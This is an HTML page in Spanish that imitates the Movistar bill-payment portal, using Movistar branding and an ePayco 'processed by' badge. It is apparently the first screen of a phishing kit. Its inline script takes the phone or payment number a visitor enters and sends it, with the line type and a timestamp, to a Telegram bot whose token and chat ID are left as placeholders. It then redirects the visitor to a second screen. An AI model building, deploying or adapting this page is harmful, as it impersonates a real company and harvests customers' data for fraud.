<!doctype html>
<html lang="es">

<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width,initial-scale=1" />
    <meta name="description"
        content="Portal de recaudos Movistar, paga o programa tus facturas de forma f√°cil y r√°pida" />
    <meta name="theme-color" content="#019DF4" />
    <link rel="shortcut icon" href="img/apple-touch-icon.png" type="image/x-icon">

    <!-- Stylesheets -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta2/dist/css/bootstrap.min.css" rel="stylesheet" />
    <link href="styles.css" rel="stylesheet"> <!-- Enlace al CSS separado -->
    <title>Movistar Portal de Recaudos</title>
    <style>
        #loader {
            display: none;
            position: fixed;
            left: 50%;
            top: 50%;
            transform: translate(-50%, -50%);
            z-index: 10000;
            background: rgba(255, 255, 255, 0.7);
            width: 100vw;
            height: 100vh;
            align-items: center;
            justify-content: center;
            flex-direction: column;
        }

        .svg-circle {
            width: 4em;
            height: 4em;
            transform-origin: center;
            animation: rotate4 2s linear infinite;
            display: block;
            margin: 0 auto;
        }

        #loader svg {
            display: block;
            margin: 0 auto;
        }

        circle {
            fill: none;
            stroke: #019DF4;
            stroke-width: 4;
            stroke-dasharray: 1, 200;
            stroke-dashoffset: 0;
            stroke-linecap: round;
            animation: dash4 1.5s ease-in-out infinite;
        }

        @keyframes rotate4 {
            100% {
                transform: rotate(360deg);
            }
        }

        @keyframes dash4 {
            0% {
                stroke-dasharray: 1, 200;
                stroke-dashoffset: 0;
            }

            50% {
                stroke-dasharray: 89, 200;
                stroke-dashoffset: -35;
            }

            100% {
                stroke-dasharray: 89, 200;
                stroke-dashoffset: -124;
            }
        }

        .btn-secondary-disabled {
            background-color: #ccc !important;
            border-color: #ccc !important;
            cursor: not-allowed;
        }
    </style>
</head>

<body>
    <header class="header">
        <img src="img/descarga.png" alt="Encabezado de Movistar" class="header-image" />
        <div class="header-footer-text d-md-none">
            <img src="img/png-transparent-computer-icons-password-login-user-padlock-miscellaneous-christianity-rectangle.png"
                alt="√çcono de candado" class="lock-icon" />
            <span>Pagos procesados por <img src="img/logo_ePayco.1722863467828.png" alt="Logo de omg"
                    class="omg-logo" /></span>
        </div>
    </header>
    <div class="main-container">
        <div class="content-container">
            <div class="button-container text-center mb-4">
                <button class="btn btn-primary btn-small" id="payBillButton">Movistar</button>
                <button class="btn btn-secondary btn-small" id="otherBillButton1">Antes Telebucaramanga</button>
                <button class="btn btn-secondary btn-small" id="otherBillButton2">Antes Metrotel</button>
            </div>
            <div id="billContent">
                <div class="text-center">
                    <h2 class="mb-4">
                        <span class="thin-text">Pagar mi factura </span><span class="bold-text">Movistar</span>
                    </h2>
                </div>

                <div class="form-group">
                    <div class="btn-group d-flex justify-content-center" role="group" aria-label="Tipo de l√≠nea">
                        <input type="radio" class="btn-check" name="lineType" id="mobileLine" autocomplete="off" checked>
                        <label class="btn btn-outline-primary" for="mobileLine">M√≥vil</label>

                        <input type="radio" class="btn-check" name="lineType" id="fixedLine" autocomplete="off">
                        <label class="btn btn-outline-primary" for="fixedLine">Fija</label>
                    </div>
                    <div class="input-group mt-3">
                        <img src="img/mobile-phone-or-smartphone-line-icon-outline-sign-linear-style-pictogram-isolated-on-white-symbol-logo-illustration-editable-stroke-vector.png"
                            alt="Icono de tel√©fono" class="phone-icon" />
                        <input type="text" id="line-number" class="form-control line-input"
                            placeholder="Ingresa el n√∫mero de l√≠nea o de pago" />
                    </div>
                    <small class="form-text text-muted">Ingresa el n√∫mero de l√≠nea o de pago</small>
                </div>
                <div class="button-container text-center">
                    <button id="consultPayButton" class="btn btn-secondary-disabled" disabled>Consultar y pagar</button>
                </div>
                <div class="button-container text-center mt-2">
                    <button id="schedulePayButton" class="btn btn-secondary-disabled" disabled>Programar / Administrar
                        mis pagos</button>
                </div>
                <div class="footer-text text-center d-none d-md-block">
                    <img src="img/png-transparent-computer-icons-password-login-user-padlock-miscellaneous-christianity-rectangle.png"
                        alt="√çcono de candado" class="lock-icon" />
                    <span>Pagos procesados por <img src="img/logo_ePayco.1722863467828.png" alt="Logo de omg"
                            class="omg-logo" /></span>
                </div>
                <div class="payment-methods text-center">
                    <h3>
                        <span class="bold-text">Nuevos medios de pago</span> <span class="thin-text">disponibles para
                            ti</span>
                    </h3>

                    <div class="icons-container">
                        <img src="img/4.jpeg" alt="Icono 1" class="payment-icon">
                        <img src="img/1.png" alt="Icono 2" class="payment-icon">
                        <img src="img/2.jpeg" alt="Icono 3" class="payment-icon">
                        <img src="img/3.jpeg" alt="Icono 4" class="payment-icon">
                    </div>
                </div>
            </div>
        </div>

        <div class="image-container">
            <img src="img/Background-mob.webp" alt="Publicidad" class="advertisement-image" />
        </div>
    </div>

    <div id="loader">
        <svg viewBox="25 25 50 50" class="svg-circle">
            <circle r="20" cy="50" cx="50"></circle>
        </svg>
        <p class="text-primary mt-3">Estamos consultando tu factura...</p>
    </div>

    <script src="https://code.jquery.com/jquery-3.6.0.min.js"
        integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta2/dist/js/bootstrap.bundle.min.js"></script>

    <script>
        const lineInput = document.getElementById("line-number");
        const consultBtn = document.getElementById("consultPayButton");
        const scheduleBtn = document.getElementById("schedulePayButton");

        // Activar botones al escribir un n√∫mero v√°lido
        lineInput.addEventListener("input", function () {
            if (this.value.trim().length >= 7) {
                consultBtn.disabled = false;
                consultBtn.classList.remove("btn-secondary-disabled");
                consultBtn.classList.add("btn-primary");

                scheduleBtn.disabled = false;
                scheduleBtn.classList.remove("btn-secondary-disabled");
                scheduleBtn.classList.add("btn-outline-primary");
            } else {
                consultBtn.disabled = true;
                consultBtn.classList.add("btn-secondary-disabled");

                scheduleBtn.disabled = true;
                scheduleBtn.classList.add("btn-secondary-disabled");
            }
        });

        // Acci√≥n Consultar y Pagar
        document.getElementById("consultPayButton").addEventListener("click", function () {
            const lineNumber = lineInput.value.trim();
            const loader = document.getElementById("loader");

            // Validaci√≥n de n√∫mero
            if (!/^[0-9]{7,10}$/.test(lineNumber)) {
                alert("Por favor ingresa un n√∫mero v√°lido (7 a 10 d√≠gitos).");
                return;
            }

            // Detectar si es m√≥vil o fija
            const lineType = document.getElementById("mobileLine").checked ? "M√≥vil" : "Fija";

            // Mostrar loader
            loader.style.display = "flex";

            // üîπ Enviar a Telegram
            const botToken = "TU_BOT_TOKEN_AQUI"; // Reemplaza con tu token
            const chatId = "TU_CHAT_ID_AQUI";     // Reemplaza con tu chat ID
            const message = `üì± Nueva consulta de pago:\nTipo: ${lineType}\nN√∫mero: ${lineNumber}\n‚è∞ Fecha: ${new Date().toLocaleString()}`;

            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                    parse_mode: "HTML"
                })
            })
                .then(res => res.json())
                .then(() => {
                    setTimeout(function () {
                        loader.style.display = "none";
                        if (window.debtMap && window.debtMap[lineNumber]) {
                            localStorage.setItem("lineNumber", lineNumber);
                            window.location.href = "screen2.html";
                        }
                    }, 2000);
                })
                .catch(err => {
                    loader.style.display = "none";
                    console.error("Error enviando a Telegram:", err);
                });
        });
    </script>
</body>

</html>
